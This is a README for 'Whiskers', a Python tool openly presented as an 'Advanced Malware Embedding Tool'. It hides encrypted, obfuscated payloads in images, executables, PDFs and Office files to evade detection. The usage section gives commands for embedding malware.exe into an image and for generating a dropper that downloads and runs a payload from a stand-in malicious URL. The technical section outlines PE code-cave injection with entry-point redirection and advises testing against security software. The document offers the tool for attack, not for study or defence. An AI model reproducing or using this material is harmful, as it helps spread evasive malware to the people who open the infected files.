
```markdown
# Whiskers

<div align="center">

![Whiskers Logo](https://example.com/whiskers-logo.png)

**Advanced Malware Embedding Tool**

[![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/username/whiskers)

</div>

## Overview

Whiskers is a sophisticated tool designed for embedding malicious payloads into various file formats with advanced stealth techniques. It supports multiple file types and provides encryption, compression, and obfuscation capabilities to help evade detection.

## Features

- **Multi-format Support**: Embed payloads in PNG, JPG, SYS, DLL, EXE, DOC, DOCX, PDF, MP3, MP4, AVI, and GIF files
- **Advanced Steganography**: Format-specific embedding techniques for maximum stealth
- **Payload Encryption**: Fernet symmetric encryption with optional password protection
- **Compression**: Zlib compression to reduce payload size
- **Obfuscation**: XOR and base64 encoding to evade signature-based detection
- **Extraction Capabilities**: Extract embedded payloads from carrier files
- **Stub Generation**: Create droppers that can download and execute payloads

## Installation

### Prerequisites

- Python 3.6 or higher
- pip package manager

### Dependencies

```bash
pip install -r requirements.txt
````

### Requirements

```text
cryptography
pefile
olefile
pyinstaller
```

## Usage

### Embedding a Payload

```bash
python whiskers.py embed carrier.png payload.exe output.png --password mypassword
```

Options:

* `-f, --format`: Specify file format (if not detectable from extension)
* `-p, --password`: Password for encryption
* `--no-encrypt`: Disable encryption
* `--no-compress`: Disable compression
* `--no-obfuscate`: Disable obfuscation

### Extracting a Payload

```bash
python whiskers.py extract carrier.png extracted.exe --key output.png.key
```

Options:

* `-f, --format`: Specify file format (if not detectable from extension)
* `-k, --key`: Key file for decryption

### Generating a Stub

```bash
python whiskers.py stub dropper.py --url http://example.com/payload.exe --key encryption_key
```

Options:

* `-u, --url`: URL to download payload from
* `-k, --key`: Decryption key

## Supported File Formats

| Format      | Technique                   | Notes                                              |
| ----------- | --------------------------- | -------------------------------------------------- |
| PNG         | Custom chunk insertion      | Inserts payload as a custom PNG chunk              |
| JPG/JPEG    | EXIF data manipulation      | Hides payload in EXIF metadata                     |
| EXE/DLL/SYS | Code cave injection         | Modifies PE structure with entry point redirection |
| DOC         | OLE stream manipulation     | Embeds in OLE document structure                   |
| DOCX        | ZIP structure modification  | Adds payload as a new file in the ZIP archive      |
| PDF         | JavaScript object injection | Inserts executable JavaScript in PDF               |
| MP3         | ID3 tag manipulation        | Uses custom ID3 tags for payload storage           |
| MP4         | Free atom insertion         | Creates a new atom in MP4 container                |
| AVI         | Junk chunk insertion        | Adds payload as a junk chunk                       |
| GIF         | Application extension       | Uses GIF application extension block               |

## Examples

### Embedding an executable in an image with encryption

```bash
python whiskers.py embed image.png malware.exe infected.png --password securepassword
```

### Creating a dropper that downloads from a URL

```bash
python whiskers.py stub dropper.py --url http://malicious-site.com/payload.bin
```

### Compiling the dropper to an executable

```bash
pyinstaller --onefile --noconsole dropper.py
```

## Architecture

Whiskers consists of several core components:

* **Embedding Engine**: Format-specific embedding techniques
* **Payload Processor**: Encryption, compression, and obfuscation
* **Extraction Engine**: Reverse the embedding process
* **Stub Generator**: Create executable droppers

## Technical Details

### PE File Injection

For executable files, Whiskers:

1. Analyzes the PE structure
2. Finds or creates a code cave
3. Injects the payload
4. Modifies the entry point to execute the payload
5. Adds a return jump to continue original execution

### Image Steganography

For image files, Whiskers:

1. Analyzes the file structure
2. Identifies suitable injection points
3. Inserts the payload in metadata or custom structures
4. Preserves file functionality

## Security Considerations

* Use strong passwords for encryption
* Consider additional obfuscation techniques
* Test against security software
* Understand legal implications in your jurisdiction

## Contributing

Contributions are welcome. Please fork the repository and submit a pull request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
